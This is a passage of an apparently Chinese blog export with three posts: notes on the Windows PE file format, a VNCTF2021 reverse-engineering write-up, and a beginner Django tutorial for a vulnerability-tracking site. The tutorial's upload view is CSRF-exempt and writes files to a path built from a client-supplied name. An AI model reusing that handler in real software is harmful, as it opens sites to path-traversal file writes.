(for e_oeminfo) 0x24</span><br><span class="line">	WORD e_oeminfo;						&#x2F;&#x2F;OEM information; e_oemid specific 0x26 </span><br><span class="line">	WORD e_res2[10];					&#x2F;&#x2F;Reserved words 0x28</span><br><span class="line">	LONG e_lfanew;						&#x2F;&#x2F;offset to NT header</span><br><span class="line">&#125; IMAGE_DOS-HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>e_magic：DOS签名（”MZ“，也就是”4D5A“）</p>
<p>e_lfanew：指示NT头（IMAGE_NT_HEADER）的偏移（000000E0）</p>
<p><strong>DOS存根</strong>（stub）：可选项，大小不固定</p>
<p><strong>NT头</strong>：IMAGE_NT_HEADER（NT头）：F8字节，有以下三个成员</p>
<ul>
<li>Signature：50450000h（“PE”00）</li>
<li>File Header：IMAGE_FILE_HEADER，文件头</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_FILE_HEADER &#123;</span><br><span class="line">  WORD  Machine; &#x2F;&#x2F;计算机的体系结构类型，比如x86的值就是0x014c</span><br><span class="line">  WORD  NumberOfSections;&#x2F;&#x2F;节数-&gt;文件中存在的节区数量，大于0，数量要和实际节区一致，否则会运行错误</span><br><span class="line">  DWORD TimeDateStamp;&#x2F;&#x2F;文件时间戳的低32位，编译器创建此文件的时间</span><br><span class="line">  DWORD PointerToSymbolTable;&#x2F;&#x2F;符号表的偏移量，以字节为单位，如果不存在 COFF 符号表，则为零。</span><br><span class="line">  DWORD NumberOfSymbols;&#x2F;&#x2F;符号表中的符号数。</span><br><span class="line">  WORD  SizeOfOptionalHeader;&#x2F;&#x2F;指出Optional Header结构体的长度</span><br><span class="line">  WORD  Characteristics;&#x2F;&#x2F;特征，比如文件是否可运行（0x0002），是否是dll文件（0x2000）等</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<ul>
<li>Optional Header：IMAGE_OPTIONAL_HEADER，可选头</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">  WORD                 Magic; &#x2F;&#x2F;文件的状态，如果是32位结构体就是10B，64就是20B</span><br><span class="line">  BYTE                 MajorLinkerVersion;&#x2F;&#x2F;链接器的主要版本号</span><br><span class="line">  BYTE                 MinorLinkerVersion;&#x2F;&#x2F;链接器的次要版本号</span><br><span class="line">  DWORD                SizeOfCode;&#x2F;&#x2F;代码段的大小，以字节为单位</span><br><span class="line">  DWORD                SizeOfInitializedData;&#x2F;&#x2F;已初始化数据部分的大小（以字节为单位）</span><br><span class="line">  DWORD                SizeOfUninitializedData;&#x2F;&#x2F;未初始化数据部分的大小（以字节为单位）</span><br><span class="line">  DWORD                AddressOfEntryPoint;&#x2F;&#x2F;指向入口点函数的指针，代码执行的起始地址</span><br><span class="line">  DWORD                BaseOfCode;&#x2F;&#x2F;指向代码部分开头的指针</span><br><span class="line">  DWORD                BaseOfData;&#x2F;&#x2F;指向数据部分开头的指针</span><br><span class="line">  DWORD                ImageBase;&#x2F;&#x2F;文件的优先装入地址。文件加载到内存中时第一个字节的首选地址。该值是64K字节的倍数。DLL的默认值为0x10000000。应用程序的默认值为0x00400000。执行PE时，先创建进程，再载入内存，然后设置EIP寄存器的值为ImageBase+AddressOfEntryPoint</span><br><span class="line">  DWORD                SectionAlignment;&#x2F;&#x2F;加载到内存中的节的对齐方式，以字节为单位。指定了节区在内存文件中的最小单位</span><br><span class="line">  DWORD                FileAlignment;&#x2F;&#x2F;文件中节的原始数据的对齐方式，以字节为单位。指定了节区在磁盘文件中的最小单位</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;&#x2F;&#x2F;所需操作系统的主要版本号。</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;&#x2F;&#x2F;所需操作系统的次要版本号。</span><br><span class="line">  WORD                 MajorImageVersion;&#x2F;&#x2F;图像的主要版本号。</span><br><span class="line">  WORD                 MinorImageVersion;&#x2F;&#x2F;图像的次要版本号。</span><br><span class="line">  WORD                 MajorSubsystemVersion;&#x2F;&#x2F;子系统的主要版本号。</span><br><span class="line">  WORD                 MinorSubsystemVersion;&#x2F;&#x2F;子系统的次要版本号。</span><br><span class="line">  DWORD                Win32VersionValue;&#x2F;&#x2F;保留参数，必须为 0。</span><br><span class="line">  DWORD                SizeOfImage;&#x2F;&#x2F;PE image在虚拟内存中所占的空间大小</span><br><span class="line">  DWORD                SizeOfHeaders;&#x2F;&#x2F;整个PE头的大小</span><br><span class="line">  DWORD                CheckSum;&#x2F;&#x2F;文件校验和</span><br><span class="line">  WORD                 Subsystem;&#x2F;&#x2F;运行此映像所需的子系统。区分系统驱动文件和普通的可执行文件</span><br><span class="line">  WORD                 DllCharacteristics;&#x2F;&#x2F; DLL特性</span><br><span class="line">  DWORD                SizeOfStackReserve;&#x2F;&#x2F;为堆栈保留的字节数</span><br><span class="line">  DWORD                SizeOfStackCommit;&#x2F;&#x2F;为堆栈提交的字节数。</span><br><span class="line">  DWORD                SizeOfHeapReserve;&#x2F;&#x2F;为本地堆保留的字节数</span><br><span class="line">  DWORD                SizeOfHeapCommit;&#x2F;&#x2F;为本地堆提交的字节数。</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;&#x2F;&#x2F;用来指定DataDirectory数组的个数</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">  &#x2F;&#x2F;DataDirectory[0]:EXPORT</span><br><span class="line">  &#x2F;&#x2F;DataDirectory[1]:IMPORT</span><br><span class="line">  &#x2F;&#x2F;DataDirectory[2]:RESOURCE</span><br><span class="line">  &#x2F;&#x2F;DataDirectory[9]:TLS</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>

<p><strong>IMAGE_SECTION_HEADER：节区头</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_SECTION_HEADER &#123;</span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  union &#123;</span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;&#x2F;&#x2F;加载到内存中时节区的大小</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;&#x2F;&#x2F;内存中节区的起始地址（RVA）</span><br><span class="line">  DWORD SizeOfRawData;&#x2F;&#x2F;磁盘文件中节区的大小</span><br><span class="line">  DWORD PointerToRawData;&#x2F;&#x2F;磁盘中节区的起始地址</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;&#x2F;&#x2F;节区属性</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<p>PE文件加载到内存时，每个节区要完成内存地址和文件偏移间的映射：RVA-&gt;RAW</p>
<p>过程：</p>
<p>1、查找RVA所在的节区</p>
<p>2、计算文件偏移（RAW-PointerToRawData=RVA-VirtualAddress）</p>
<h5 id="0x3-IAT"><a href="#0x3-IAT" class="headerlink" title="0x3 IAT"></a>0x3 IAT</h5><p>导入地址表：保存进程、内存、DLL结构等相关内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;&#x2F;&#x2F;记录PE文件要导入哪些库文件</span><br><span class="line">DWORD    OriginalFirstThunk;&#x2F;&#x2F;INT（包含导入函数信息的结构体指针数组）的地址（RVA）</span><br><span class="line">DWORD    TimeDateStamp;</span><br><span class="line">DWORD    ForwarderChain;</span><br><span class="line">DWORD    Name;&#x2F;&#x2F;库名称字符串的地址</span><br><span class="line">DWORD    FirstThunk;&#x2F;&#x2F;IAT的地址（RVA）</span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<p>当程序导入DLL的时候，一个DLL对应一个IMAGE_IMPORT_DESCRIPTOR结构体，多个结构体形成数组，最后以一个NULL结构体结束</p>
<p>1、PE装载器会读取IID（IMAGE_IMPORT_DESCRIPTOR）的Name成员，获取dll名称字符串</p>
<p>2、使用LoadLibrary加载相应的库</p>
<p>3、读取IID的OriginalFirstThunk成员，获取INT的地址，逐一读取INT数组的值，获取IMAGE_IMPORT_BY_NAME地址</p>
<p>4、使用IMAGE_IMPORT_BY_NAME的Hint或Name项，获取相应函数的起始地址（GetProcAddress)</p>
<p>5、读取FirstThunk成员，获取IAT地址，将上面获得的相应函数的起始地址输入到相应的IAT数组值</p>
<p>IMAGE_IMPORT_DESCRIPTOR不在PE头，在PE体里，IMAGE_OPTIONAL_HEADER头中DataDirectory[1].VirtualAddress的值就是IMAGE_IMPORT_DESCRIPTOR的起始地址</p>
<h5 id="0x4-EAT"><a href="#0x4-EAT" class="headerlink" title="0x4 EAT"></a>0x4 EAT</h5><p>是一种核心机制，使不同的应用程序可以调用库文件中提供的函数</p>
<p>用来获取相应库中的导出函数的起始地址</p>
<p>PE文件中只有一个用来说明库EAT的IMAGE_EXPORT_DIRECTORY结构体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IMAGE_EXPORT_DIRECTORY STRUCT【导出表，共40字节】&#123;</span><br><span class="line">	DWORD Characteristics ; </span><br><span class="line">	DWORD TimeDateStamp ; &#x2F;&#x2F;文件生成时间</span><br><span class="line">	WORD MajorVersion     ; </span><br><span class="line">	WORD MinorVersion ;</span><br><span class="line">	DWORD Name     ; &#x2F;&#x2F;库文件名的地址</span><br><span class="line">	DWORD Base     ; &#x2F;&#x2F;基数，加上序数就是函数地址数组的索引值</span><br><span class="line">	DWORD NumberOfFunctions ; &#x2F;&#x2F;导出函数的总数</span><br><span class="line">	DWORD NumberOfNames ; &#x2F;&#x2F;以名称方式导出的函数的总数</span><br><span class="line">	DWORD AddressOfFunctions ; &#x2F;&#x2F;导出函数地址数组</span><br><span class="line">	DWORD AddressOfNames ; &#x2F;&#x2F;函数名称地址数组</span><br><span class="line">	DWORD AddressOfNameOrdinals ; &#x2F;&#x2F;导出函数序号地址数组</span><br><span class="line">&#125;;IMAGE_EXPORT_DIRECTORY ENDS</span><br></pre></td></tr></table></figure>

<p>**GetProcAddress()**：从库中获取函数地址的API，引用EAT来获取指定API的地址</p>
<p>原理：</p>
<p>1、通过AddressOfNames成员得到函数名称数组</p>
<p>2、通过在函数名称数组中比较（strcmp）指定函数名称，得到指定函数名称的索引</p>
<p>3、通过AddressOfNameOrdinals得到函数序号数组</p>
<p>4、通过指定函数名称的索引获取指定函数的序号</p>
<p>5、通过AddressOfFunctions得到函数地址数组</p>
<p>6、通过指定函数的序号用作函数地址数组的索引，得到指定函数的起始地址</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>PE</tag>
      </tags>
  </entry>
  <entry>
    <title>VNCTF2021-Reverse-wp</title>
    <url>/2021/04/13/VNCTF2021-Reverse-wp/</url>
    <content><![CDATA[<p>VNCTF2021-Reverse-wp</p>
<a id="more"></a>

<h5 id="0x1-notsudoku"><a href="#0x1-notsudoku" class="headerlink" title="0x1 notsudoku"></a>0x1 notsudoku</h5><p>查看基本信息，发现upx壳，脱壳（upx -d）</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413053005139.png" alt="image-20210413053005139"></p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413053047491.png" alt="image-20210413053047491"></p>
<p>放到ida里看看，发现并没有明文字符串，而是一堆关于py的信息</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413053232312.png" alt="image-20210413053232312"></p>
<p>可以猜测是用py打包的</p>
<p>所以尝试解包（使用最新版的pyinstxtractor.py，可以自动生成pyc文件，不用手工改magic value，这个2.pyc就是我们需要的</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413053535763.png" alt="image-20210413053535763"></p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413053444736.png" alt="image-20210413053444736"></p>
<p>但是经过查看和struct中的magic value并不相同，所以手动替换一下，使用py3.7和uncompyle6可以正常解出源码，py3.9会报错，py2也会报错，easy那个软件也会报错</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413054918399.png" alt="image-20210413054918399"></p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413054757278.png" alt="image-20210413054757278"></p>
<p>开始研究源码：</p>
<p> <img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413055029915.png" alt="image-20210413055029915"></p>
<p>替换掉一些日文：</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413055104065.png" alt="image-20210413055104065"></p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413055129674.png" alt="image-20210413055129674"></p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413055212442.png" alt="image-20210413055212442"></p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413055149840.png" alt="image-20210413055149840"></p>
<p>通过已给的数字提示以及题目，判断这是一个五阶幻方，然后要求我们按1的顺序输入每个字所在的横纵坐标</p>
<p>根据此图我们就可以推出输入的字符串</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413055310499.png" alt="image-20210413055310499"></p>
<p>编写脚本，得到flag：e3a912c1e911ad82544af0c3d753f44f</p>
<p><img src="/2021/04/13/VNCTF2021-Reverse-wp/image-20210413061037076.png" alt="image-20210413061037076"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>django-webproject</title>
    <url>/2021/03/05/django-webproject/</url>
    <content><![CDATA[<h4 id="django网站搭建"><a href="#django网站搭建" class="headerlink" title="django网站搭建"></a>django网站搭建</h4><p>–关于我最近在干嘛–</p>
<p>零基础开始的一个独立bootstrap+django网站搭建学习</p>
<p>需求：增删改查+上传下载文件+导出数据到csv+筛选+搜索</p>
<p>项目完整代码：<a href="https://github.com/0xkami/django-web">https://github.com/0xkami/django-web</a></p>
<a id="more"></a>

<h5 id="0x1-基础功能"><a href="#0x1-基础功能" class="headerlink" title="0x1 基础功能"></a>0x1 基础功能</h5><p>利用pycharm搭建一个django项目，可以成功开启最基础的访问</p>
<p>前端使用bootstrap，模版使用的是clearmin，很简洁的一个管理平台</p>
<h6 id="0x11-整体框架："><a href="#0x11-整体框架：" class="headerlink" title="0x11 整体框架："></a>0x11 整体框架：</h6><img src="/2021/03/05/django-webproject/image-20210301101823208.png" alt="image-20210301101823208">

<p>urls.py:</p>
<p><img src="/2021/03/05/django-webproject/image-20210305143550833-4928991.png" alt="image-20210305143550833"></p>
<h6 id="0x12-数据库设计："><a href="#0x12-数据库设计：" class="headerlink" title="0x12 数据库设计："></a>0x12 数据库设计：</h6><p>在电脑上装好sql，使用navicat创建连接，在django项目中创建对于数据库并迁移</p>
<p>以下就是需要存到数据库中的信息字段：</p>
<p><img src="/2021/03/05/django-webproject/image-20210301102403994-4928991.png" alt="image-20210301102403994"></p>
<p>在整体项目（和url文件在同一文件夹下）的settings中添加数据库的信息：</p>
<p><img src="/2021/03/05/django-webproject/image-20210301102612299-4928991.png" alt="image-20210301102612299"></p>
<p>在项目命令行运行 <code>python manage.py makemigrations</code>和<code>python manage.py migrate </code>，在navicat就能看到创建好的数据库</p>
<p><img src="/2021/03/05/django-webproject/image-20210301104219610-4928991.png" alt="image-20210301104219610"></p>
<h6 id="0x13-基础展示信息页面：（-分页）"><a href="#0x13-基础展示信息页面：（-分页）" class="headerlink" title="0x13 基础展示信息页面：（+分页）"></a>0x13 基础展示信息页面：（+分页）</h6><p>在数据库中插入一些信息，然后想要在某个页面中以表格的形式展示它的部分内容</p>
<p>重点代码：<code>data_sum = vul_info.objects.order_by(&#39;vul_id&#39;)</code>，vul_info是model中的类名，order_by可以根据固定字段来进行排序</p>
<p>view.py中此功能完整代码：（加了分页的功能）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@require_http_methods([&quot;GET&quot;, ])</span><br><span class="line">def vulinfo(request):</span><br><span class="line">    data_sum &#x3D; vul_info.objects.order_by(&#39;vul_id&#39;) </span><br><span class="line">    paginator &#x3D; Paginator(data_sum, 6)  # 每页6条记录</span><br><span class="line">    page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">    currentpage &#x3D; int(page)</span><br><span class="line">    all_page_num &#x3D; paginator.num_pages</span><br><span class="line">    try:</span><br><span class="line">        # 获取当前页码的记录</span><br><span class="line">        data_sum &#x3D; paginator.page(page)</span><br><span class="line">    except PageNotAnInteger:</span><br><span class="line">        # 如果用户输入的页码不是整数时,显示第1页的内容</span><br><span class="line">        data_sum &#x3D; paginator.page(1)</span><br><span class="line">    except EmptyPage:</span><br><span class="line">        # 如果用户输入的页数不在系统的页码列表中时,显示最后一页的内容</span><br><span class="line">        data_sum &#x3D; paginator.page(paginator.num_pages)</span><br><span class="line"></span><br><span class="line">    info &#x3D; &#123;</span><br><span class="line">        &quot;vuls&quot;: data_sum, # 定义了返回的数据名，在前端可以利用for循环来读取数据库里的内容</span><br><span class="line">        &quot;currentpage&quot;: currentpage,</span><br><span class="line">        &quot;all_page_num&quot;: all_page_num</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, info) # vulinfo.html是前端页面的名字</span><br></pre></td></tr></table></figure>

<p>urls.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">path(r&#39;^vulinfo&#x2F;(?P&lt;pageNumber&gt;\d+)&#39;, views.vulinfo, name&#x3D;&#39;vulinfo&#39;)</span><br></pre></td></tr></table></figure>

<p>前端页面：</p>
<p>通过for循环，可以返回需要的数据，同时做了一个详细页面点击的链接</p>
<p><img src="/2021/03/05/django-webproject/image-20210301111120033-4928991.png" alt="image-20210301111120033"></p>
<p>效果图如下：</p>
<p><img src="/2021/03/05/django-webproject/image-20210301111200294-4928991.png" alt="image-20210301111200294"></p>
<h6 id="0x14-提交信息页面：（-上传文件）"><a href="#0x14-提交信息页面：（-上传文件）" class="headerlink" title="0x14 提交信息页面：（+上传文件）"></a>0x14 提交信息页面：（+上传文件）</h6><p>使用forms进行信息的提交，在forms中进行定义：</p>
<p><img src="/2021/03/05/django-webproject/image-20210301114000246-4928991.png" alt="image-20210301114000246"></p>
<p>view.py：（加了上传文件的功能）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@csrf_exempt</span><br><span class="line">@require_http_methods([&quot;GET&quot;, &quot;POST&quot;])</span><br><span class="line">def vul_upload(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        form &#x3D; VulUploadForm(request.POST) # 获取form的内容</span><br><span class="line">        print(request.POST)</span><br><span class="line">        </span><br><span class="line">				# 上传文件功能</span><br><span class="line">        file_obj &#x3D; request.FILES.get(&quot;poc_file&quot;, None)</span><br><span class="line">        destination &#x3D; open(os.path.join(&quot;#输入上传文件的地址&quot;, request.POST.get(&quot;poc_file&quot;)),&#39;wb+&#39;)</span><br><span class="line">        for i in file_obj.chunks():</span><br><span class="line">            destination.write(i)</span><br><span class="line">        destination.close()</span><br><span class="line">        print(form)</span><br><span class="line"></span><br><span class="line">        if form.is_valid():</span><br><span class="line">            form.save()</span><br><span class="line">            return HttpResponse(&quot;新增成功&quot;)</span><br><span class="line">            content &#x3D; &#123;</span><br><span class="line">                &quot;form&quot;: form</span><br><span class="line">            &#125;</span><br><span class="line">            return render(request, &quot;insert.html&quot;, content)</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;Sorry...&#39;)</span><br><span class="line">    return render(request, &#39;insert.html&#39;)</span><br></pre></td></tr></table></figure>

<p>效果图如下：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305141424306-4928991.png" alt="image-20210305141424306"></p>
<p>下拉框和日期选择实现：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305141616584-4928991.png" alt="image-20210305141616584"></p>
<h6 id="0x15-详细信息页面："><a href="#0x15-详细信息页面：" class="headerlink" title="0x15 详细信息页面："></a>0x15 详细信息页面：</h6><p>展示所有数据库的数据，并对一部分数据提供修改的功能：</p>
<p>效果图如下：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305141656027-4928991.png" alt="image-20210305141656027"></p>
<p>信息展示的前端同基础展示信息页面</p>
<p>修改功能使用了模态框+js</p>
<p>view.py:</p>
<p>通过js实现post，传输前端数据，获取对应的vul_id和要更新的数据</p>
<p>主要语句：vul_info.objects.filter(vul_id=xx).update(snort=xx)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def update_snort(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        snort_info &#x3D; request.POST.get(&#39;snort&#39;)</span><br><span class="line">        snort_detail &#x3D; request.POST.get(&#39;snort_detail&#39;)</span><br><span class="line">        vulid &#x3D; request.POST.get(&#39;vul_id&#39;)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(snort&#x3D;snort_info)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(snort_detail&#x3D;snort_detail)</span><br><span class="line">        return HttpResponse(&#39;save success!&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def update_track(request):</span><br><span class="line">    if request.method &#x3D;&#x3D; &quot;POST&quot;:</span><br><span class="line">        track_info &#x3D; request.POST.get(&#39;track_stauts&#39;, &#39;&#39;)</span><br><span class="line">        vulid &#x3D; request.POST.get(&#39;vul_id&#39;)</span><br><span class="line">        print(vulid)</span><br><span class="line">        vul_info.objects.filter(vul_id&#x3D;vulid).update(track_stauts&#x3D;track_info)</span><br><span class="line">        return HttpResponse(&#39;save success!&#39;)</span><br></pre></td></tr></table></figure>

<p>前端：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305142711997-4928991.png" alt="image-20210305142711997"></p>
<p>js:</p>
<p><img src="/2021/03/05/django-webproject/image-20210305142818341-4928991.png" alt="image-20210305142818341"></p>
<p>效果图：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305142905738-4928991.png" alt="image-20210305142905738"></p>
<p>至此基础功能都已经实现</p>
<h5 id="0x2-附加功能"><a href="#0x2-附加功能" class="headerlink" title="0x2 附加功能"></a>0x2 附加功能</h5><h6 id="0x21-搜索功能"><a href="#0x21-搜索功能" class="headerlink" title="0x21 搜索功能"></a>0x21 搜索功能</h6><p>使用q搜索，提供名字\cve\cnnvd的搜索</p>
<p>view.py：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def search(request):</span><br><span class="line">    q &#x3D; request.GET.get(&#39;q&#39;)</span><br><span class="line">    search_list &#x3D; vul_info.objects.filter(Q(name__icontains&#x3D;q) | Q(cve__icontains&#x3D;q) | Q(cnnvd__icontains&#x3D;q) )</span><br><span class="line">    error_msg &#x3D; &#39;No result&#39;</span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, &#123;&#39;vuls&#39;: search_list,</span><br><span class="line">                                            &#39;error_msg&#39;: error_msg,</span><br><span class="line">                                            &#125;)</span><br></pre></td></tr></table></figure>

<p>前端：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305143500136-4928991.png" alt="image-20210305143500136"></p>
<p>效果：</p>
<p>在这里输入关键字即可：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305143657723-4928991.png" alt="image-20210305143657723"></p>
<h6 id="0x22-下拉框筛选显示"><a href="#0x22-下拉框筛选显示" class="headerlink" title="0x22 下拉框筛选显示"></a>0x22 下拉框筛选显示</h6><p>事先预定好了一些关键筛选，点击即可跳转对应的筛选页面：</p>
<p>筛选页面view.py：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def filter_1(request):</span><br><span class="line">    search_lists &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;1))</span><br><span class="line">    error_msg &#x3D; &#39;No result&#39;</span><br><span class="line">    return render(request, &#39;vulinfo.html&#39;, &#123;&#39;vuls&#39;: search_lists,</span><br><span class="line">                                            &#39;error_msg&#39;: error_msg,</span><br><span class="line">                                            &#125;)</span><br></pre></td></tr></table></figure>

<p>前端：下拉框使用dropdown，点击后就会跳转</p>
<p><img src="/2021/03/05/django-webproject/image-20210305143848554-4928991.png" alt="image-20210305143848554"></p>
<p>效果图：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305143711042-4928991.png" alt="image-20210305143711042"></p>
<h6 id="0x23-导出"><a href="#0x23-导出" class="headerlink" title="0x23 导出"></a>0x23 导出</h6><p>前端写了一个导出按钮，点击即可输出为一个csv文件，支持不同筛选页面的输出</p>
<p>view.py:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def export(request):</span><br><span class="line">    vul_lis &#x3D; vul_info.objects.all()</span><br><span class="line">    response &#x3D; HttpResponse(content_type&#x3D;&#39;text&#x2F;csv&#39;)</span><br><span class="line">    time_now &#x3D; time.strftime(&#39;%Y%m%d&#39;)</span><br><span class="line">    filename &#x3D; &#39;vul_&#39; + time_now</span><br><span class="line">    response.write(codecs.BOM_UTF8)</span><br><span class="line">    response[&#39;Content-Disposition&#39;] &#x3D; f&#39;attachment; filename&#x3D;&quot;&#123;filename&#125;.csv&quot;&#39;</span><br><span class="line">    writer &#x3D; csv.writer(response)</span><br><span class="line">    writer.writerow([&#39;vul_id&#39;, &#39;name&#39;, &#39;track&#39;, &#39;poc&#39;,</span><br><span class="line">                     &#39;snort&#39;, &#39;cve&#39;, &#39;cnnvd&#39;,</span><br><span class="line">                     &#39;ips&#39;, &#39;sac&#39;, &#39;note&#39;, &#39;update-time&#39;])</span><br><span class="line">    for vul in vul_lis:</span><br><span class="line">        writer.writerow([vul.vul_id, vul.name, vul.track_stauts, vul.poc, vul.snort, vul.cve, vul.cnnvd,</span><br><span class="line">                         vul.protection_status_ips, vul.protection_status_sac, vul.note, vul.updated_time])</span><br><span class="line">    return response</span><br></pre></td></tr></table></figure>

<p>前端：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305144111506-4928991.png" alt="image-20210305144111506"></p>
<p>效果图：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305144435191-4928991.png" alt="image-20210305144435191"></p>
<h6 id="0x24-信息汇总页面"><a href="#0x24-信息汇总页面" class="headerlink" title="0x24 信息汇总页面"></a>0x24 信息汇总页面</h6><p>使用了c3表格，有模板</p>
<p>view.py：传输了一些数据到前端</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def index(request):</span><br><span class="line">    sum &#x3D; vul_info.objects.all().count()</span><br><span class="line">    high &#x3D; vul_info.objects.filter(severity&#x3D;&#39;2&#39;).count()</span><br><span class="line">    med &#x3D; vul_info.objects.filter(severity&#x3D;&#39;1&#39;).count()</span><br><span class="line">    low &#x3D; vul_info.objects.filter(severity&#x3D;&#39;0&#39;).count()</span><br><span class="line">    wgzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;0&#39;).count()</span><br><span class="line">    gzzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;1&#39;).count()</span><br><span class="line">    ygzs &#x3D; vul_info.objects.filter(track_stauts&#x3D;&#39;2&#39;).count()</span><br><span class="line">    tgips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;1)).count()</span><br><span class="line">    tg &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;0) &amp; Q(protection_status_sac&#x3D;1)).count()</span><br><span class="line">    ips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;1) &amp; Q(protection_status_sac&#x3D;0)).count()</span><br><span class="line">    ntgips &#x3D; vul_info.objects.filter(Q(protection_status_ips&#x3D;0) &amp; Q(protection_status_sac&#x3D;0)).count()</span><br><span class="line">    d &#x3D; int(tgips &#x2F; sum * 100)</span><br><span class="line">    e &#x3D; int(tg &#x2F; sum * 100)</span><br><span class="line">    f &#x3D; int(ips &#x2F; sum * 100)</span><br><span class="line">    g &#x3D; int(ntgips &#x2F; sum * 100)</span><br><span class="line">    a &#x3D; int(wgzs &#x2F; sum * 100)</span><br><span class="line">    b &#x3D; int(gzzs &#x2F; sum * 100)</span><br><span class="line">    c &#x3D; int(ygzs &#x2F; sum * 100)</span><br><span class="line"></span><br><span class="line">    return render(request, &#39;index.html&#39;, &#123;&#39;sum&#39;: sum, &#39;high&#39;: high, &#39;med&#39;: med, &#39;low&#39;: low,</span><br><span class="line">                                          &#39;wgz&#39;: a, &#39;gzz&#39;: b, &#39;ygz&#39;: c,</span><br><span class="line">                                          &#39;wgzs&#39;: wgzs, &#39;gzzs&#39;: gzzs, &#39;ygzs&#39;: ygzs,</span><br><span class="line">                                          &#39;tgips&#39;: d, &#39;tg&#39;: e, &#39;ips&#39;: f,&#39;ntgips&#39;: g,</span><br><span class="line">                                          &#39;tgipss&#39;: tgips, &#39;tgs&#39;: tg, &#39;ipss&#39;: ips,&#39;ntgipss&#39;: ntgips&#125;)</span><br></pre></td></tr></table></figure>

<p>效果图：</p>
<p><img src="/2021/03/05/django-webproject/image-20210305144403691-4928991.png" alt="image-20210305144403691"></p>
